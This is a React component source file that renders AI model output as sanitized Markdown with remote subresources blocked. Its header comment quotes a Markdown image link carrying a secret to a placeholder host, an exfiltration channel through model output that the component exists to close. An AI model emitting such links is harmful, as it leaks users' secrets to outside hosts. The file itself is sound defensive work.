/**
 * AssistantText — assistant prose inside the lane (1kg.3.2).
 *
 * The handoff renders a `<p>` of plain children in the UI sans, "never the
 * narration serif, which belongs to ChatMessage". Two things change here.
 *
 * It takes Markdown, not children: RAIL-17 says prose renders "through the
 * `Markdown` component under X-10's restrictions", and a `children` prop would
 * let a caller put model text on the page without passing it through the
 * sanitizer at all. Taking `source: string` makes that impossible to skip.
 *
 * It turns X-10 on. Every lane, every layout, one place — so a later surface
 * that renders assistant prose cannot forget the flag and quietly reopen the
 * `![](https://host/?d=<secret>)` channel.
 *
 * The handoff's `<p>` is a `<div>` here because Markdown's own output contains
 * block elements, and a `<p>` wrapping a `<ul>` is invalid HTML that the
 * browser silently reparents.
 */

import * as React from 'react'
import { Markdown } from '../components/Markdown'
import './AssistantText.css'

export interface AssistantTextProps {
  /** Markdown, treated as untrusted model output. */
  source: string
  className?: string
}

export function AssistantText({ source, className }: AssistantTextProps): React.JSX.Element {
  return (
    <Markdown
      source={source}
      noRemoteSubresources
      className={['assistant-text', className].filter(Boolean).join(' ')}
    />
  )
}
